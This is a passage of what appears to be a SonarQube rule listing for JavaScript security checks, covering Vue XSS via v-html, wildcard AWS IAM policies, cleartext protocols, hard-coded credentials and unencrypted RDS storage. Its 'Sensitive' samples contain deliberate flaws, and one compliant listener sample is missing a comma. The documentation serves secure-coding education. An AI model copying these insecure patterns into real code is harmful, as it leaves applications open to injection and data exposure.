  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6299">
              javascript:S6299
            </a>
          </td>
          <td>
            <details>
              <p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like
<code>innerText</code> instead of <code>innerHtml</code>.</p>
<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will
introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or
impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<p>The application needs to render HTML content which:</p>
<ul>
  <li> could be user-controlled and not previously sanitized. </li>
  <li> is difficult to understand how it was constructed. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as
  possible on built-in auto-escaping Vue.js features. </li>
  <li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript
  (<code>javascript:onClick(...)</code>). </li>
  <li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>
<pre>
&lt;div v-html="htmlContent"&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
Vue.component('element', {
  render: function (createElement) {
    return createElement(
      'div',
      {
        domProps: {
          innerHTML: this.htmlContent, // Noncompliant
        }
      }
    );
  },
});
</pre>
<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
&lt;div domPropsInnerHTML={this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{{ htmlContent }}&lt;/div&gt;
</pre>
<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>
<pre>
Vue.component('element', {
  render: function (createElement) {
    return createElement(
      'div',
      {
        domProps: {
          innerText: this.htmlContent,
        }
      },
      this.htmlContent // Child node
    );
  },
});
</pre>
<p>When using JSX, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{this.htmlContent}&lt;/div&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> <a href="https://vuejs.org/v2/guide/security.html#Injecting-HTML">Vue.js - Security - Injecting HTML</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6304">
              javascript:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a
href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>"*"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: ["iam:CreatePolicyVersion"],
            resources: ["*"] // Sensitive
        })
    ]
})
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: ["iam:CreatePolicyVersion"],
            resources: ["arn:aws:iam:::policy/team1/*"]
        })
    ]
})
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>
  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5332">
              javascript:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url = "http://example.com"; // Sensitive
url = "ftp://anonymous@example.com"; // Sensitive
url = "telnet://anonymous@example.com"; // Sensitive
</pre>
<p>For <a href="https://nodemailer.com">nodemailer</a>:</p>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({
  secure: false, // Sensitive
  requireTLS: false // Sensitive
});
</pre>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({}); // Sensitive
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp">ftp</a>:</p>
<pre>
var Client = require('ftp');
var c = new Client();
c.connect({
  'secure': false // Sensitive
});
</pre>
<p>For <a href="https://github.com/mkozjak/node-telnet-client">telnet-client</a>:</p>
<pre>
const Telnet = require('telnet-client'); // Sensitive
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const alb = new ApplicationLoadBalancer(this, 'ALB', {
  vpc: vpc,
  internetFacing: true
});

alb.addListener('listener-http-default', {
  port: 8080,
  open: true
}); // Sensitive

alb.addListener('listener-http-explicit', {
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new ApplicationListener(this, 'listener-http-explicit-constructor', {
  loadBalancer: alb,
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const nlb = new NetworkLoadBalancer(this, 'nlb', {
  vpc: vpc,
  internetFacing: true
});

var listenerNLB = nlb.addListener('listener-tcp-default', {
  port: 1234
}); // Sensitive

listenerNLB = nlb.addListener('listener-tcp-explicit', {
  protocol: Protocol.TCP, // Sensitive
  port: 1234
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new NetworkListener(this, 'listener-tcp-explicit-constructor', {
  loadBalancer: nlb,
  protocol: Protocol.TCP, // Sensitive
  port: 8080
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new CfnListener(this, 'listener-http', {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: "HTTP", // Sensitive
  port: 80
});

new CfnListener(this, 'listener-tcp', {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: "TCP", // Sensitive
  port: 80
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

new CfnLoadBalancer(this, 'elb-tcp', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'tcp' // Sensitive
  }]
});

new CfnLoadBalancer(this, 'elb-http', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'http' // Sensitive
  }]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

const loadBalancer = new LoadBalancer(this, 'elb-tcp-dict', {
    vpc,
    internetFacing: true,
    healthCheck: {
    port: 80,
    },
    listeners: [
    {
        externalPort:10000,
        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive
        internalPort:10000
    }]
});

loadBalancer.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive
  internalPort:10001
});
loadBalancer.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive
  internalPort:10002
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';

new CfnReplicationGroup(this, 'unencrypted-implicit', {
  replicationGroupDescription: 'exampleDescription'
}); // Sensitive

new CfnReplicationGroup(this, 'unencrypted-explicit', {
  replicationGroupDescription: 'exampleDescription',
  transitEncryptionEnabled: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from 'aws-cdk-lib/aws-kinesis';

new CfnStream(this, 'cfnstream-implicit-unencrytped', undefined); // Sensitive

new CfnStream(this, 'cfnstream-explicit-unencrytped', {
  streamEncryption: undefined // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from 'aws-cdk-lib/aws-kinesis';

new Stream(this, 'stream-explicit-unencrypted', {
  encryption: StreamEncryption.UNENCRYPTED // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<pre>
url = "https://example.com";
url = "sftp://anonymous@example.com";
url = "ssh://anonymous@example.com";
</pre>
<p>For <a href="https://nodemailer.com">nodemailer</a> one of the following options must be set:</p>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({
  secure: true,
  requireTLS: true,
  port: 465,
  secured: true
});
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp">ftp</a>:</p>
<pre>
var Client = require('ftp');
var c = new Client();
c.connect({
  'secure': true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const alb = new ApplicationLoadBalancer(this, 'ALB', {
  vpc: vpc,
  internetFacing: true
});

alb.addListener('listener-https-explicit', {
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});

alb.addListener('listener-https-implicit', {
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new ApplicationListener(this, 'listener-https-explicit', {
  loadBalancer: loadBalancer,
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const nlb = new NetworkLoadBalancer(this, 'nlb', {
  vpc: vpc,
  internetFacing: true
});

nlb.addListener('listener-tls-explicit', {
  protocol: Protocol.TLS,
  port: 1234,
  certificates: [certificate]
});

nlb.addListener('listener-tls-implicit', {
  port: 1234,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new NetworkListener(this, 'listener-tls-explicit', {
  loadBalancer: loadBalancer,
  protocol: Protocol.TLS,
  port: 8080,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new CfnListener(this, 'listener-https', {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: "HTTPS",
  port: 80
  certificates: [certificate]
});

new CfnListener(this, 'listener-tls', {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: "TLS",
  port: 80
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

new CfnLoadBalancer(this, 'elb-ssl', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'ssl',
    sslCertificateId: sslCertificateId
  }]
});

new CfnLoadBalancer(this, 'elb-https', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'https',
    sslCertificateId: sslCertificateId
  }]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer, LoadBalancingProtocol } from 'aws-cdk-lib/aws-elasticloadbalancing';

const lb = new LoadBalancer(this, 'elb-ssl', {
  vpc,
  internetFacing: true,
  healthCheck: {
    port: 80,
  },
  listeners: [
    {
      externalPort:10000,
      externalProtocol:LoadBalancingProtocol.SSL,
      internalPort:10000
    }]
});

lb.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.SSL,
  internalPort:10001
});
lb.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTPS,
  internalPort:10002
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';

new CfnReplicationGroup(this, 'encrypted-explicit', {
  replicationGroupDescription: 'example',
  transitEncryptionEnabled: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from 'aws-cdk-lib/aws-kinesis';

new Stream(this, 'stream-implicit-encrypted');

new Stream(this, 'stream-explicit-encrypted-selfmanaged', {
  encryption: StreamEncryption.KMS,
  encryptionKey: encryptionKey,
});

new Stream(this, 'stream-explicit-encrypted-managed', {
  encryption: StreamEncryption.MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from 'aws-cdk-lib/aws-kinesis';

new CfnStream(this, 'cfnstream-explicit-encrypted', {
  streamEncryption: {
    encryptionType: encryptionType,
    keyId: encryptionKey.keyId,
  }
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2068">
              javascript:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
var mysql = require('mysql');

var connection = mysql.createConnection(
{
  host:'localhost',
  user: "admin",
  database: "project",
  password: "mypassword", // sensitive
  multipleStatements: true
});

connection.connect();
</pre>
<h2>Compliant Solution</h2>
<pre>
var mysql = require('mysql');

var connection = mysql.createConnection({
  host: process.env.MYSQL_URL,
  user: process.env.MYSQL_USERNAME,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE
});
connection.connect();
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6303">
              javascript:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul>
  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>
  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>
</ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of services and security bypasses via data corruption or deletion </li>
</ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBCluster(this, 'example', {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBInstance(this, 'example', {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';
import { aws_ec2 as ec2 } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

const cluster = new rds.DatabaseCluster(this, 'example', {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, 'example', {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: 'exampleSnapshot',
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, 'example', {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
